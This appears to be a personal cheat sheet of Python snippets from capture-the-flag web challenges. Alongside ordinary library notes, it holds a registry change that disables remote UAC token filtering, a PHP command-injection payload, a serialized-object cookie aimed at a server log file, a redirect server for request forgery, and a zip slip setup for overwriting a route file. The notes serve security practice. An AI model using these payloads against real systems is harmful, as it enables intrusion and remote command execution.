
winreg

To manipulate windows registry.

Usually, it is something like:
1 -> connect to the Hive
	winreg.ConnectRegistry(computerName,winreg.HKEY_LOCAL_MACHINE)
2 -> open the key
	regpath = "SOFTWARE\Microsoft\CurrentVersion\Policies\System"
	winreg.OpenKey(reg,regpath,0,access=winreg.KEY_WRITE)
3 -> manipulate the info inside
	winreg.SetValueEx(key,"LocalAccountTokenFilterPolicy",0,winreg.REG_DWORD,1)
______________________________________________________________________________________________________________________________________________

__import__("os").popen("ls").read()
Starts a process using a command


requests >> to make url requisitions;
r = requests.get(URL+"/?format=${system($_GET[pwd])}&pwd="+pwd) >> make the requisition and collects the answer (value of r is the answer)
text = r.text >> to see the answer and manipulate it


import requests

# CODE FOR THE COOKIE SHOWN AT THE BOTTOM OF THE SOURCE CODE
cookies = {'PHPSESSID': "Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ=="}
headers = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0"}
url = "http://159.65.95.35:30381" # address and port changes whenever start a new instance of the website

response = requests.get(url, cookies=cookies, headers=headers)
webpage = response.text

print(response.text)

----------------------------------------------------------------------------------------------

urllib.parse >> to separate url variables
>>> from urllib.parse import urlparse
>>> u = urlparse('//www.cwi.nl:80/%7Eguido/Python.html')
>>> u
ParseResult(scheme='', netloc='www.cwi.nl:80', path='/%7Eguido/Python.html',
            params='', query='', fragment='')
>>> u._replace(scheme='http')
ParseResult(scheme='http', netloc='www.cwi.nl:80', path='/%7Eguido/Python.html',
            params='', query='', fragment='')
			
urllib.parse.SplitResult.geturl()
urllib.parse.quote() >> url encode the values

-------------------------------------------------------------------------------------------
sys >> to take sys.args[] >> arguments
------------------------------------------------------------------------------------------

from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
  def do_GET(self):
      self.send_response(302)
      self.send_header('Location', sys.argv[1])
      self.end_headers()

HTTPServer(("0.0.0.0", 80), Redirect).serve_forever()

Explained: HTTPServer (connection made, and response sent).keeping open
_______________________________________________________________________________________________________
CHANGING THE ROUTE FILE TO GET THE FLAG (ZIP SLIP ATTACK)

from flask import Blueprint, request, render_template, abort
from application.util import extract_from_archive

web = Blueprint('web', __name__)
api = Blueprint('api', __name__)

@web.route('/')
def index():
    return render_template('index.html')

@web.route('/flag')
def flag():
    with open('/app/flag', 'r') as f:
        return f.read()

@api.route('/unslippy', methods=['POST'])
def cache():
    if 'file' not in request.files:
        return abort(400)

    extraction = extract_from_archive(request.files['file'])
    if extraction:
        return {"list": extraction}, 200

    return '', 204
